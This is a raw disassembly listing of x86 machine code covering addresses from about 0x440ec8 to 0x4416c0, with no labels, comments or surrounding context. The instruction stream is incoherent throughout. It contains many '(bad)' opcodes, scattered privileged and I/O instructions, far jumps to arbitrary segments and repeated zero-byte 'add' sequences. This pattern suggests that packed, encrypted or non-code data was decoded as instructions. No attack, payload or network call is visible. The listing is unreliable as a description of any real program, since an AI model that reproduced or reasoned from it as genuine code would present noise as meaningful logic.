  440ec8:	inc    eax
  440ec9:	pop    eax
  440eca:	xchg   BYTE PTR [ebp+0x33],ch
  440ecd:	jnp    0x440f24
  440ecf:	call   0xd4c07840
  440ed4:	iret   
  440ed5:	xchg   esi,eax
  440ed6:	mov    edi,0xc48cc85c
  440edb:	iret   
  440edc:	push   eax
  440edd:	(bad)  
  440ede:	sti    
  440edf:	adc    eax,0xb4fa217
  440ee4:	push   cs
  440ee5:	push   ds
  440ee6:	test   esi,eax
  440ee8:	inc    edx
  440ee9:	(bad)  
  440eea:	stos   DWORD PTR es:[edi],eax
  440eeb:	sbb    DWORD PTR [edi],esp
  440eed:	sahf   
  440eee:	out    0xc9,eax
  440ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440ef1:	imul   edi,eax,0x83169013
  440ef7:	rol    BYTE PTR [edi+0xc],1
  440efa:	jge    0x440f57
  440efc:	les    edx,FWORD PTR [ecx+eax*2-0x4840a140]
  440f03:	add    BYTE PTR [eax],al
  440f05:	add    BYTE PTR [eax],al
  440f07:	add    cl,ah
  440f09:	mov    dl,0x5c
  440f0b:	dec    ebp
  440f0c:	outs   dx,DWORD PTR ds:[esi]
  440f0d:	repz sar BYTE PTR [esi+0x68],0x31
  440f12:	mov    esp,0x43f21307
  440f17:	add    ebx,ebp
  440f19:	jmp    0x831599ee
  440f1e:	jp     0x440ef8
  440f20:	or     esp,DWORD PTR [eax+0x6c]
  440f23:	dec    ebp
  440f24:	das    
  440f25:	or     esp,DWORD PTR [ecx-0x43cec782]
  440f2b:	pop    es
  440f2c:	adc    esi,edx
  440f2e:	add    eax,DWORD PTR [ebx]
  440f30:	lods   eax,DWORD PTR ds:[esi]
  440f31:	jmp    0xf3169fb6
  440f36:	daa    
  440f37:	mov    edx,ecx
  440f39:	sbb    BYTE PTR [ebp+ecx*2+0x2f],0x23
  440f3e:	popa   
  440f3f:	jle    0x440f49
  440f41:	xor    DWORD PTR [edi+eax*1+0x2e3f213],edi
  440f48:	jge    0x440f33
  440f4a:	jo     0x440ed6
  440f4c:	push   ecx
  440f4d:	cmp    BYTE PTR [edx-0x30],0xd3
  440f51:	bound  ebp,QWORD PTR [ebp+ecx*2-0x11]
  440f55:	cmp    al,BYTE PTR [eax+0x7e]
  440f58:	fdiv   DWORD PTR [eax]
  440f5a:	cmp    al,0x7
  440f5c:	adc    esi,edx
  440f5e:	mov    ds:0x20e94d02,eax
  440f63:	mov    dl,BYTE PTR [ecx-0x7e]
  440f66:	dec    edx
  440f67:	fcom   st(7)
  440f69:	pop    edi
  440f6a:	pop    esp
  440f6b:	dec    ebp
  440f6c:	add    BYTE PTR [eax],al
  440f6e:	add    BYTE PTR [eax],al
  440f70:	add    BYTE PTR [edi-0x5781ff0e],ch
  440f76:	xor    BYTE PTR [edi+eax*1],bh
  440f79:	adc    esi,edx
  440f7b:	add    DWORD PTR [edx],0x1d
  440f7e:	jmp    0xbe969f93
  440f83:	xchg   DWORD PTR [edx+0x620e82d1],ecx
  440f89:	aad    0xd3
  440f8b:	mov    bh,0xf6
  440f8d:	std    
  440f8e:	mov    edx,0x2f88ad8d
  440f93:	iret   
  440f94:	push   ebp
  440f95:	xchg   ecx,eax
  440f96:	cmp    eax,0x6919d6d5
  440f9b:	jmp    0x1844:0x95d45f60
  440fa2:	xor    eax,0x391bc55c
  440fa7:	jmp    0x946c:0x93aae96c
  440fae:	mov    dl,0xe
  440fb0:	jb     0x441001
  440fb2:	lods   al,BYTE PTR ds:[esi]
  440fb3:	xchg   ebx,eax
  440fb4:	test   eax,0x24957d28
  440fb9:	mov    BYTE PTR [ebp+0x2a8c1ae7],al
  440fbf:	or     ebp,esi
  440fc1:	or     bh,BYTE PTR [ecx]
  440fc3:	jmp    0xf75:0x5c339192
  440fca:	mov    ebx,0xf516c862
  440fcf:	bound  eax,QWORD PTR [ecx+ecx*1]
  440fd2:	popa   
  440fd3:	jmp    0x0:0x72
  440fda:	fimul  WORD PTR [ebx-0x68419dc4]
  440fe0:	ds (bad) 
  440fe2:	(bad)  
  440fe3:	scas   eax,DWORD PTR es:[edi]
  440fe4:	aas    
  440fe5:	fwait
  440fe6:	push   esp
  440fe7:	jmp    0x440f76
  440fe9:	and    eax,0x355385a4
  440fee:	enter  0x8cbe,0x22
  440ff2:	cmp    eax,0xb256b96
  440ff7:	cmp    edx,ebp
  440ff9:	fs dec ecx
  440ffb:	inc    eax
  440ffc:	arpl   WORD PTR [edx-0x59],bp
  440fff:	mov    ds:0x36ac950e,eax
  441004:	push   esp
  441005:	add    BYTE PTR [ecx+0x29],dl
  441008:	gs sbb al,0x52
  44100b:	jbe    0x441087
  44100d:	add    dh,dl
  44100f:	ds push 0x7d
  441012:	ins    DWORD PTR es:[edi],dx
  441013:	scas   eax,DWORD PTR es:[edi]
  441014:	bound  esp,QWORD PTR [ecx]
  441016:	add    dh,ch
  441018:	in     eax,0x8b
  44101a:	mov    edi,0xe0017086
  44101f:	loope  0x44107a
  441021:	push   ecx
  441022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441023:	dec    esi
  441024:	dec    edi
  441025:	aas    
  441026:	imul   ebp,DWORD PTR [edi+0x3465c46b],0x283475aa
  441030:	dec    ebp
  441031:	cld    
  441032:	push   edx
  441033:	mov    dl,0x6b
  441035:	retf   
  441036:	out    dx,al
  441037:	xor    DWORD PTR [ebp-0x48],esp
  44103a:	cmp    ebp,eax
  44103c:	xor    eax,DWORD PTR [ebx+0x0]
  441042:	add    BYTE PTR [edx+edx*4+0xe],bh
  441046:	jbe    0x44109d
  441048:	sub    bh,BYTE PTR ds:0x39f5a218
  44104e:	mov    edi,DWORD PTR [edi+0x72523f92]
  441054:	in     eax,0xd
  441056:	push   eax
  441057:	cwde   
  441058:	cmp    eax,0x9fa583db
  44105d:	cmp    ecx,ecx
  44105f:	mov    dl,0x75
  441061:	pop    esp
  441062:	push   es
  441063:	mov    dh,BYTE PTR [esi+0x22]
  441066:	enter  0xb1c5,0x6b
  44106a:	retf   
  44106b:	dec    esi
  44106c:	sub    cl,BYTE PTR [ebp-0x48]
  44106f:	inc    edx
  441070:	addr16 xor cl,bh
  441073:	mov    eax,0xb1ebe5eb
  441078:	sub    DWORD PTR ds:0xe5e3a8b8,edi
  44107e:	mov    edi,DWORD PTR [ebx+0x34]
  441081:	ret    
  441082:	seto   BYTE PTR [esi+0x54]
  441086:	(bad)  
  441087:	lahf   
  441088:	enter  0xbf90,0x87
  44108c:	dec    ebp
  44108d:	xor    bh,bh
  44108f:	(bad)  
  441090:	int3   
  441091:	xor    al,0x43
  441093:	test   BYTE PTR [ebx-0x38],dl
  441096:	repz add al,0xef
  441099:	xchg   esi,eax
  44109a:	inc    edx
  44109b:	je     0x4410d0
  44109d:	stc    
  44109e:	inc    cl
  4410a0:	jnp    0x44103b
  4410a2:	inc    ecx
  4410a3:	mov    al,ds:0xe7bc7b
  4410a8:	add    BYTE PTR [eax],al
  4410aa:	add    BYTE PTR [eax],al
  4410ac:	dec    ecx
  4410ad:	stos   BYTE PTR es:[edi],al
  4410ae:	adc    al,BYTE PTR [eax]
  4410b0:	adc    ecx,DWORD PTR [eax]
  4410b2:	(bad)  
  4410b3:	jl     0x441114
  4410b5:	stc    
  4410b6:	(bad)  
  4410b7:	mov    edi,0x429ac6bd
  4410bc:	cmp    al,0xf5
  4410be:	or     eax,0x12255785
  4410c3:	jge    0x441124
  4410c5:	sbb    DWORD PTR [edx+0x14cbe87a],edx
  4410cb:	xor    BYTE PTR [ebx],0xcc
  4410ce:	or     eax,0x228a0b00
  4410d3:	mov    ebx,DWORD PTR [ebp+0x3b]
  4410d6:	ret    
  4410d7:	test   dh,dl
  4410d9:	xor    ebx,DWORD PTR [edx]
  4410db:	repnz dec DWORD PTR [eax-0x6f]
  4410df:	ret    
  4410e0:	mov    WORD PTR [esi+0x52],es
  4410e3:	jae    0x441077
  4410e5:	inc    esp
  4410e6:	inc    ebp
  4410e7:	test   BYTE PTR [esi-0x65],cl
  4410ea:	xchg   edi,eax
  4410eb:	push   edx
  4410ec:	fdivr  st,st(5)
  4410ee:	cwde   
  4410ef:	leave  
  4410f0:	call   0xd03c706c
  4410f5:	dec    esp
  4410f6:	dec    esi
  4410f7:	add    ecx,DWORD PTR ds:0xafdde8c
  4410fd:	test   eax,0xb2c07a91
  441102:	div    al
  441104:	sub    DWORD PTR [ebx-0x76],edi
  441107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441108:	and    dl,BYTE PTR [edi-0x4d10068c]
  44110e:	adc    BYTE PTR [edx],0x0
  441111:	add    BYTE PTR [eax],al
  441113:	add    BYTE PTR [eax],al
  441115:	or     esi,DWORD PTR [eax+0x43]
  441118:	aam    0x14
  44111a:	jo     0x4410c3
  44111c:	mov    ds,WORD PTR [ecx-0x36]
  44111f:	and    esi,DWORD PTR [edx+0x78]
  441122:	mov    ecx,0x2f934074
  441127:	mov    eax,0xa92c6def
  44112c:	cmp    al,0xeb
  44112e:	push   cs
  44112f:	dec    ebx
  441130:	sbb    ebp,ebx
  441132:	aaa    
  441133:	pop    DWORD PTR [ebx]
  441135:	jecxz  0x4410d8
  441137:	pop    esp
  441138:	sar    DWORD PTR [edi+0x27],0x3b
  44113c:	mov    al,ds:0x6bb22dd6
  441141:	and    eax,0xb47ab8c0
  441146:	out    dx,al
  441147:	sti    
  441148:	sub    bh,0x3d
  44114b:	cmc    
  44114c:	mov    cs,WORD PTR [eax+0x7b]
  44114f:	add    ah,BYTE PTR [eax-0x5e]
  441152:	xchg   edi,eax
  441153:	je     0x44114d
  441155:	das    
  441156:	mov    dl,0xea
  441158:	adc    dl,BYTE PTR ds:0x6288a770
  44115e:	into   
  44115f:	add    eax,0xdfc9c98f
  441164:	jno    0x44115e
  441166:	mov    eax,0x2f933f74
  44116b:	cmp    bh,ch
  44116d:	in     eax,0x2b
  44116f:	and    DWORD PTR [ebx+ebx*2],edi
  441172:	bnd ret 0xb29
  441176:	outs   dx,DWORD PTR ds:[esi]
  441177:	inc    ebx
  441178:	rol    DWORD PTR [eax],cl
  44117a:	add    BYTE PTR [eax],al
  44117c:	add    BYTE PTR [eax],al
  44117e:	adc    al,0x70
  441180:	out    0x8e,eax
  441182:	fxch   st(1)
  441184:	push   cs
  441185:	and    eax,0x6ae9ba40
  44118a:	ja     0x441141
  44118c:	cmc    
  44118d:	cld    
  44118e:	push   ds
  44118f:	ins    BYTE PTR es:[edi],dx
  441190:	out    0x72,al
  441192:	ror    DWORD PTR [eax-0x4752178c],0x3e
  441199:	mov    ebx,0xc4f3d0c1
  44119e:	xchg   ebx,eax
  44119f:	mov    dl,0x8d
  4411a1:	and    eax,0x7dcf3397
  4411a6:	xchg   ebp,eax
  4411a7:	sub    eax,0xc45062ca
  4411ac:	xchg   ebp,eax
  4411ad:	xor    al,0xec
  4411af:	sub    al,0x53
  4411b1:	icebp  
  4411b2:	xor    DWORD PTR [si-0x23],edx
  4411b6:	popf   
  4411b7:	jae    0x44115f
  4411b9:	fimul  WORD PTR ds:0xc9c6e99d
  4411bf:	xor    al,0xc6
  4411c1:	out    dx,al
  4411c2:	(bad)  
  4411c3:	sbb    ecx,DWORD PTR [edi]
  4411c5:	jmp    0x9af475d
  4411ca:	mov    WORD PTR [esi],?
  4411cc:	pop    edi
  4411cd:	jb     0x4411f6
  4411cf:	cld    
  4411d0:	xchg   ebp,eax
  4411d1:	and    al,0x70
  4411d3:	jge    0x4411bb
  4411d5:	sbb    cl,BYTE PTR [eax-0x2e36bbd3]
  4411db:	mov    bl,0x1
  4411dd:	jmp    0x93264efc
  4411e2:	add    BYTE PTR [eax],al
  4411e4:	add    BYTE PTR [eax],al
  4411e6:	add    BYTE PTR [ebp+0x157d542f],cl
  4411ec:	cmp    eax,0x9be7e9ea
  4411f1:	xchg   ebp,eax
  4411f2:	lods   al,BYTE PTR ds:[esi]
  4411f3:	and    BYTE PTR [di-0x18],dh
  4411f7:	mov    ebp,0xa3af9567
  4411fc:	bound  eax,QWORD PTR [eax+0x41]
  4411ff:	adc    DWORD PTR [ebp+0xe],edi
  441202:	add    BYTE PTR [ecx+0x2c14ce2e],bh
  441208:	outs   dx,BYTE PTR ds:[esi]
  441209:	pop    ebp
  44120a:	add    ebp,DWORD PTR [edx]
  44120c:	gs out 0x85,al
  44120f:	retw   0x8337
  441213:	hlt    
  441214:	xchg   edi,eax
  441215:	push   cs
  441216:	jbe    0x4411d9
  441218:	es gs hlt 
  44121b:	xor    ch,bh
  44121d:	or     DWORD PTR [ebx+0x469383df],ecx
  441223:	jne    0x441207
  441225:	pop    eax
  441226:	mov    esi,DWORD PTR [edi]
  441228:	mov    bh,0x5b
  44122a:	push   eax
  44122b:	xchg   BYTE PTR [edx+ebp*2-0x3c],ah
  44122f:	pop    ecx
  441230:	jbe    0x441201
  441232:	je     0x441299
  441234:	fisubr DWORD PTR [edx-0x35]
  441237:	inc    esi
  441238:	fst    DWORD PTR [edx-0x12da5d3d]
  44123e:	pop    ebp
  44123f:	sub    bh,BYTE PTR [eax]
  441241:	ret    0x9c75
  441244:	sub    eax,0xc7390865
  441249:	adc    al,0x8b
  44124b:	add    BYTE PTR [eax],al
  44124d:	add    BYTE PTR [eax],al
  44124f:	add    BYTE PTR [esi+eiz*4-0x4cd6e95f],al
  441256:	push   cs
  441257:	lea    ecx,[edx+ebp*1-0x75d5a05]
  44125e:	adc    eax,0x12c6e985
  441263:	mov    ebx,DWORD PTR [edx+edx*2-0x6e]
  441267:	dec    ebp
  441268:	and    DWORD PTR [edx+ebx*1],ebp
  44126b:	mov    ecx,eax
  44126d:	mov    dl,0x47
  44126f:	pop    esi
  441270:	jb     0x4412e0
  441272:	inc    edx
  441273:	mov    ecx,DWORD PTR [eax+eiz*8]
  441276:	stos   BYTE PTR es:[edi],al
  441277:	int3   
  441278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441279:	outs   dx,DWORD PTR ds:[esi]
  44127a:	aad    0xcc
  44127c:	mov    ch,0x6f
  44127e:	aad    0xcc
  441280:	nop
  441281:	neg    BYTE PTR [edx+0xa0e0beb]
  441287:	test   DWORD PTR [ebp-0x57],ebx
  44128a:	fwait
  44128b:	push   edx
  44128c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44128d:	sbb    DWORD PTR [ebx-0x64e567be],ebx
  441293:	dec    edx
  441294:	pushf  
  441295:	sbb    ebx,DWORD PTR [ebx-0x65067fae]
  44129b:	inc    edx
  44129c:	xchg   esp,eax
  44129d:	cli    
  44129e:	ret    
  44129f:	gs nop
  4412a1:	stc    
  4412a2:	call   0x8ff5:0x2eb18842
  4412a9:	lods   eax,DWORD PTR ds:[esi]
  4412aa:	xchg   edx,eax
  4412ab:	ret    
  4412ac:	mov    al,0x16
  4412ae:	push   esp
  4412af:	pop    ds
  4412b0:	nop
  4412b1:	push   ss
  4412b2:	fwait
  4412b3:	jmp    0x4412b5
  4412b5:	add    BYTE PTR [eax],al
  4412b7:	add    BYTE PTR [eax],al
  4412b9:	ficom  WORD PTR [eax-0x8]
  4412bc:	pop    es
  4412bd:	adc    eax,0x1507dfd6
  4412c2:	mov    es,WORD PTR [ecx+ebx*2+0xf09bd]
  4412c9:	or     ecx,DWORD PTR [esi+0x6fde84ea]
  4412cf:	hlt    
  4412d0:	(bad)  
  4412d1:	mov    ecx,0xa9fff7cb
  4412d6:	retf   
  4412d7:	idiv   edi
  4412d9:	or     BYTE PTR [esi+0x3e9065ca],cl
  4412df:	cwde   
  4412e0:	xlat   BYTE PTR ds:[ebx]
  4412e1:	nop
  4412e2:	retf   
  4412e3:	or     eax,0x92460d4e
  4412e8:	call   DWORD PTR [edi]
  4412ea:	int3   
  4412eb:	mov    ebp,0xd042d684
  4412f0:	pop    ebx
  4412f1:	iret   
  4412f2:	(bad)  
  4412f3:	ret    0xffff
  4412f6:	retf   
  4412f7:	or     eax,0x129f4ec1
  4412fc:	add    BYTE PTR [eax-0x2a94084e],dl
  441302:	mov    eax,0xeb147748
  441307:	add    al,0x44
  441309:	push   esp
  44130a:	out    dx,al
  44130b:	pop    ss
  44130c:	adc    esi,0x1e444ba5
  441312:	sub    al,0xb2
  441314:	jecxz  0x44132c
  441316:	pop    ebp
  441317:	fisttp DWORD PTR [edx+0x419a54f6]
  44131d:	add    BYTE PTR [eax],al
  44131f:	add    BYTE PTR [eax],al
  441321:	add    BYTE PTR [ebx-0x24b7dc4e],dl
  441327:	out    0x3b,al
  441329:	dec    eax
  44132a:	retf   
  44132b:	out    0xaa,al
  44132d:	mov    ch,BYTE PTR [ebx-0x680e93a4]
  441333:	das    
  441334:	jmp    0xd999:0xb2278ff0
  44133b:	push   edi
  44133c:	xor    eax,0xb2299000
  441341:	jecxz  0x4412d7
  441343:	ins    BYTE PTR es:[edi],dx
  441344:	pop    ebx
  441345:	icebp  
  441346:	(bad)  
  441347:	cli    
  441348:	imul   esi,DWORD PTR [esi+0x58],0xffffffb5
  44134c:	and    ecx,ebx
  44134e:	adc    eax,0xe18af7ae
  441353:	jp     0x44135d
  441355:	mov    ecx,ecx
  441357:	jbe    0x4413cf
  441359:	jns    0x441393
  44135b:	mov    ch,0xf7
  44135d:	add    eax,ebx
  44135f:	scas   al,BYTE PTR es:[edi]
  441360:	jb     0x4413d8
  441362:	mov    ds:0xd7bd5c95,eax
  441367:	sub    DWORD PTR [edx],edi
  441369:	rcr    BYTE PTR [edx+esi*8-0x4db97d0a],1
  441370:	mov    esp,0xcca58241
  441375:	inc    esi
  441376:	sub    BYTE PTR [ecx-0x4ae443f8],0xe
  44137d:	jbe    0x4413fd
  44137f:	pop    ebx
  441380:	dec    ebx
  441381:	stos   DWORD PTR es:[edi],eax
  441382:	out    dx,eax
  441383:	mov    ah,0x94
  441385:	ja     0x441387
  441387:	add    BYTE PTR [eax],al
  441389:	add    BYTE PTR [eax],al
  44138b:	and    esi,DWORD PTR [ebp+0x2892e9e9]
  441391:	mov    ebx,0x95b293e9
  441396:	ja     0x441393
  441398:	mov    ah,0xe9
  44139a:	jmp    0xe9bbc858
  44139f:	or     BYTE PTR [ecx-0x1],dh
  4413a2:	push   es
  4413a3:	lea    esi,[eax+0x46]
  4413a6:	ret    
  4413a7:	xchg   ebx,eax
  4413a8:	dec    esp
  4413a9:	push   cs
  4413aa:	push   0xffffffd5
  4413ac:	pop    eax
  4413ad:	push   cs
  4413ae:	push   0xffffffdd
  4413b0:	fs jae 0x6a52604a
  4413b7:	pop    ebp
  4413b8:	pusha  
  4413b9:	push   cs
  4413ba:	je     0x4413c9
  4413bc:	fmul   QWORD PTR [esi]
  4413be:	jmp    0x5fdf7756
  4413c3:	adc    esi,DWORD PTR [ecx+ebp*8-0x2ed0be17]
  4413ca:	rol    DWORD PTR [ecx+0x9dee9bc],1
  4413d0:	in     al,dx
  4413d1:	sbb    eax,0x2ef011a9
  4413d6:	fld    TBYTE PTR fs:[edx+0x1d5da982]
  4413dd:	cwde   
  4413de:	daa    
  4413df:	xor    al,0x2d
  4413e1:	inc    ecx
  4413e2:	dec    ebp
  4413e3:	or     ebp,esi
  4413e5:	dec    eax
  4413e6:	or     al,0xd2
  4413e8:	scas   eax,DWORD PTR es:[edi]
  4413e9:	push   cs
  4413ea:	mov    ch,0xd8
  4413ec:	out    0xda,eax
  4413ee:	lods   eax,DWORD PTR ds:[esi]
  4413ef:	add    BYTE PTR [eax],al
  4413f1:	add    BYTE PTR [eax],al
  4413f3:	add    al,cl
  4413f5:	out    0xda,eax
  4413f7:	cmp    al,0x9
  4413f9:	enter  0x2495,0x9c
  4413fd:	sub    eax,0x32e9005c
  441402:	test   BYTE PTR [eax],0xa6
  441405:	and    edi,0x4d2b4189
  44140b:	or     al,0x70
  44140d:	jbe    0x4413a0
  44140f:	js     0x441406
  441411:	sub    BYTE PTR [ecx],ah
  441413:	mov    esp,DWORD PTR [edi]
  441415:	call   0xaee5aa04
  44141a:	push   cs
  44141b:	add    BYTE PTR [edx],dh
  44141d:	hlt    
  44141e:	push   ebp
  44141f:	adc    esi,DWORD PTR [edi]
  441421:	pop    edx
  441422:	jmp    0x586ebe26
  441427:	xor    BYTE PTR [esi],dl
  441429:	loopne 0x441486
  44142b:	push   ecx
  44142c:	pop    es
  44142d:	dec    eax
  44142e:	pop    edi
  44142f:	cmp    edi,DWORD PTR [ecx-0x5a3b9451]
  441435:	xor    al,0xa9
  441437:	je     0x4413ea
  441439:	xor    dl,dl
  44143b:	(bad)  
  44143c:	ds sub ch,ch
  44143f:	pop    ebp
  441440:	mov    edx,0xec305029
  441445:	jecxz  0x44142c
  441447:	push   edx
  441448:	repnz ins BYTE PTR es:[edi],dx
  44144a:	icebp  
  44144b:	sub    DWORD PTR [edx+0x3e],ebp
  44144e:	out    0x83,al
  441450:	xor    eax,0xc5c08cb3
  441455:	mov    bl,0x6a
  441457:	iret   
  441458:	add    BYTE PTR [eax],al
  44145a:	add    BYTE PTR [eax],al
  44145c:	add    BYTE PTR [esi],bh
  44145e:	dec    edx
  44145f:	pop    ss
  441460:	sbb    esp,0x3a4b593a
  441466:	mov    bl,0x5d
  441468:	add    eax,0xffe718be
  44146d:	(bad)  
  44146e:	sub    ecx,DWORD PTR [ebp-0x4]
  441471:	mov    DWORD PTR [ecx],ebp
  441473:	push   eax
  441474:	xor    BYTE PTR [edx-0x45e0e93],ah
  44147a:	cmp    eax,0x59083e6
  44147f:	jmp    0xd77d:0xf9cd082
  441486:	sub    edx,DWORD PTR [edi-0x2fb93fbf]
  44148c:	mul    DWORD PTR [ecx+0x50]
  44148f:	push   ebx
  441490:	out    0x19,eax
  441492:	aaa    
  441493:	(bad)  
  441494:	clc    
  441495:	adc    eax,DWORD PTR [ebp-0x232f7d17]
  44149b:	push   cs
  44149c:	jge    0x441465
  44149e:	pop    ebx
  44149f:	xchg   esi,eax
  4414a0:	inc    ecx
  4414a1:	adc    BYTE PTR [esi-0x28],0xfb
  4414a5:	bound  eax,QWORD PTR [eax+0x53]
  4414a8:	out    0x41,eax
  4414aa:	ja     0x44150e
  4414ac:	clc    
  4414ad:	adc    eax,DWORD PTR [ebp-0x32f7d17]
  4414b3:	call   0x76cfec34
  4414b8:	sbb    eax,0x19f89415
  4414bd:	or     eax,DWORD PTR [ebx-0x6f]
  4414c0:	inc    DWORD PTR [eax]
  4414c2:	add    BYTE PTR [eax],al
  4414c4:	add    BYTE PTR [eax],al
  4414c6:	(bad)  
  4414c7:	pushf  
  4414c8:	and    al,0x43
  4414ca:	test   BYTE PTR [edi],ch
  4414cc:	adc    al,0x83
  4414ce:	push   eax
  4414cf:	sub    BYTE PTR [ebx],dl
  4414d1:	jge    0x44154b
  4414d3:	cwde   
  4414d4:	stc    
  4414d5:	add    eax,0x7414a413
  4414da:	lea    ebx,[eax-0x65]
  4414dd:	clc    
  4414de:	pop    edi
  4414df:	xchg   ecx,eax
  4414e0:	pop    DWORD PTR [edx+0x54]
  4414e3:	in     al,dx
  4414e4:	imul   eax,DWORD PTR [ecx-0x80],0x1de74d14
  4414eb:	outs   dx,BYTE PTR ds:[esi]
  4414ec:	pop    ebp
  4414ed:	clc    
  4414ee:	adc    ebx,DWORD PTR [eax+0x16]
  4414f1:	adc    DWORD PTR [eax-0x10],0x11
  4414f5:	jge    0x441556
  4414f7:	popa   
  4414f8:	imul   eax,DWORD PTR [ecx+0x60],0x1bc162b2
  4414ff:	push   es
  441500:	daa    
  441501:	jg     0x44154c
  441503:	fwait
  441504:	add    esi,DWORD PTR [esi+0x8]
  441507:	mov    dl,0x6d
  441509:	sar    edi,1
  44150b:	xor    eax,0x731308bb
  441510:	jecxz  0x44151a
  441512:	jne    0x441495
  441514:	pusha  
  441515:	pop    edi
  441516:	xchg   BYTE PTR [edi],dh
  441518:	js     0x441513
  44151a:	cmp    BYTE PTR ds:0x48a46faa,0x63
  441521:	add    al,0x90
  441523:	mov    dl,0xcb
  441525:	std    
  441526:	shl    DWORD PTR [ebp-0x11],0xf8
  44152a:	add    BYTE PTR [eax],al
  44152c:	add    BYTE PTR [eax],al
  44152e:	add    BYTE PTR [edx-0x478c918f],dl
  441534:	mov    cl,0x7a
  441536:	leave  
  441537:	mov    ebx,0x7fca6d02
  44153c:	cmp    eax,0xa4515c09
  441541:	xor    BYTE PTR [ebx+0x1c],dh
  441544:	jbe    0x441539
  441546:	mov    bh,dl
  441548:	es sti 
  44154a:	xchg   BYTE PTR [eax-0x4f],bl
  44154d:	or     al,0x1c
  44154f:	or     eax,0x868713ff
  441554:	mov    cl,0x63
  441556:	and    edx,DWORD PTR [ebx]
  441558:	mov    cl,0x6a
  44155a:	bsr    esi,DWORD PTR [edx-0x64]
  44155e:	cmp    edi,0xe303f7b1
  441564:	mov    edx,0xb1fb8a2c
  441569:	test   DWORD PTR [ebx],0x46c1bcc4
  44156f:	(bad)  
  441570:	daa    
  441571:	sti    
  441572:	mov    dl,0x26
  441574:	mov    cl,0xa8
  441576:	jb     0x441584
  441578:	clc    
  441579:	push   cs
  44157a:	stc    
  44157b:	adc    ah,bh
  44157d:	jmp    0xa5ed:0xf67ba718
  441584:	stos   BYTE PTR es:[edi],al
  441585:	jmp    0x93f9e4f4
  44158a:	test   eax,0x9e8db407
  44158f:	adc    BYTE PTR [esi+0x7236],0x0
  441596:	add    BYTE PTR [eax],al
  441598:	shr    BYTE PTR [ebp+ecx*4+0x2f258280],1
  44159f:	ins    BYTE PTR es:[edi],dx
  4415a0:	bound  esp,QWORD PTR [ebx+ecx*1]
  4415a3:	mov    edx,0x8998e653
  4415a8:	xchg   ebx,eax
  4415a9:	mov    dl,0xe
  4415ab:	aam    0xdb
  4415ad:	in     eax,0x90
  4415af:	lea    edx,[ebx-0x3a2af14e]
  4415b5:	mov    ds:0xb3b8f1cd,al
  4415ba:	test   eax,0xe9aa4260
  4415bf:	(bad)  
  4415c0:	fchs   
  4415c2:	fwait
  4415c3:	xchg   esp,eax
  4415c4:	cmp    edi,edi
  4415c6:	xchg   ebp,eax
  4415c7:	aaa    
  4415c8:	cmp    ecx,DWORD PTR [edi]
  4415ca:	loopne 0x4415ea
  4415cc:	and    dh,BYTE PTR [esi]
  4415ce:	dec    ebx
  4415cf:	adc    DWORD PTR [esi],edx
  4415d1:	je     0x4415e5
  4415d3:	shl    DWORD PTR fs:[ebx],cl
  4415d6:	adc    al,0x6a
  4415d8:	shr    BYTE PTR [edx-0x54f7270b],cl
  4415de:	arpl   sp,sp
  4415e0:	mov    esi,0x93e9b64c
  4415e5:	mov    dl,0x62
  4415e7:	in     al,dx
  4415e8:	and    BYTE PTR [ecx-0x17],cl
  4415eb:	fsubrp st(1),st
  4415ed:	ss push ebx
  4415ef:	loope  0x441583
  4415f1:	retf   0x249b
  4415f4:	mov    ah,0xff
  4415f6:	xchg   ebp,eax
  4415f7:	add    BYTE PTR [edi-0x1a],ch
  4415fa:	xchg   ebx,eax
  4415fb:	into   
  4415fc:	add    BYTE PTR [eax],al
  4415fe:	add    BYTE PTR [eax],al
  441600:	add    BYTE PTR [ecx-0x2e],ah
  441603:	stc    
  441604:	jmp    esi
  441606:	xor    eax,0xf6ac04cd
  44160b:	pop    ebp
  44160c:	add    ebp,DWORD PTR [edx+0x6c8be6f1]
  441612:	mov    dl,0x93
  441614:	push   ebp
  441615:	or     edi,esp
  441617:	rol    DWORD PTR [ebx],1
  441619:	ja     0x441619
  44161b:	jmp    0x950b001f
  441620:	fsub   st(1),st
  441622:	mov    bl,0xe
  441624:	cmp    DWORD PTR [edx],0xffffffc5
  441627:	imul   edx,ecx,0xfffffff9
  44162a:	sub    al,0x2
  44162c:	mov    DWORD PTR [ecx],esp
  44162e:	mov    eax,0x2d714593
  441633:	push   ebp
  441634:	or     BYTE PTR [eax],dh
  441636:	mov    eax,0x2f0200e9
  44163b:	iret   
  44163c:	pop    edi
  44163d:	inc    edx
  44163e:	pop    ss
  44163f:	inc    ebp
  441640:	ret    
  441641:	gs repnz aad 0xcc
  441645:	or     al,0x2f
  441647:	test   BYTE PTR [ebx+0x4593ca65],0xa1
  44164e:	out    0xd8,al
  441650:	mov    esp,ebx
  441652:	pop    ds
  441653:	and    eax,edx
  441655:	sub    al,0xac
  441657:	xchg   esp,eax
  441658:	inc    edx
  441659:	add    ebp,DWORD PTR [esi]
  44165b:	in     eax,dx
  44165c:	pop    ebp
  44165d:	stos   DWORD PTR es:[edi],eax
  44165e:	mov    dl,0xe
  441660:	push   esi
  441661:	add    ah,BYTE PTR [edi-0x37]
  441664:	add    BYTE PTR [eax],al
  441666:	add    BYTE PTR [eax],al
  441668:	add    BYTE PTR [eax],al
  44166a:	jns    0x44161f
  44166c:	and    esi,edx
  44166e:	fsubr  QWORD PTR [edi+0x22769aa1]
  441674:	out    0x5e,eax
  441676:	loop   0x441690
  441678:	inc    ebp
  441679:	ret    0x9590
  44167c:	or     eax,0xf069e37
  441681:	mov    eax,0xf85e781c
  441686:	(bad)  
  441687:	and    al,0x71
  441689:	pop    edx
  44168a:	push   edx
  44168b:	xchg   ebp,eax
  44168c:	or     eax,0x2be1b4d
  441691:	xor    eax,0x54e8ce3a
  441696:	arpl   WORD PTR [ecx-0x41],bx
  441699:	test   ch,dh
  44169b:	in     eax,0x50
  44169d:	or     edx,DWORD PTR [eax+0x90bd114]
  4416a3:	fild   WORD PTR [edx]
  4416a5:	xchg   DWORD PTR [esi-0x7b],edx
  4416a8:	cmp    dl,BYTE PTR [edx+0xd9914]
  4416ae:	bound  eax,QWORD PTR [esi+eiz*8-0x72c864f9]
  4416b5:	call   edi
  4416b7:	cwde   
  4416b8:	out    0xe,eax
  4416ba:	mov    DWORD PTR [edi],ebp
  4416bc:	es inc edi
  4416bf:	cwde   
  4416c0:	loopne 0x4416c8
